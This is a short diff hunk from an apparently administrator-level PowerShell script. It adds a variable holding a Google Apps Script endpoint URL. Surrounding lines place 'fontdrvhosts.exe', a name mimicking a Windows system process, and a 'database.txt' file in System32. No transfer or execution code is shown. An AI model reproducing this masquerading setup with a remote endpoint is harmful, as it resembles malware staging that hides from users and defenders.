@@ -19,6 +19,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 # Define paths and variables
 # -----------------------------
+$apiUrl = "https://script.google.com/macros/s/AKfycbwWmaZUH0XIcaEP1u5UDlXRG5MHH5crVSb3_1Ve2J8eOT-z9GW5u8IFbkEPzJXzLbrS/exec"
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
 $databasePath = Join-Path $system32Path "database.txt"
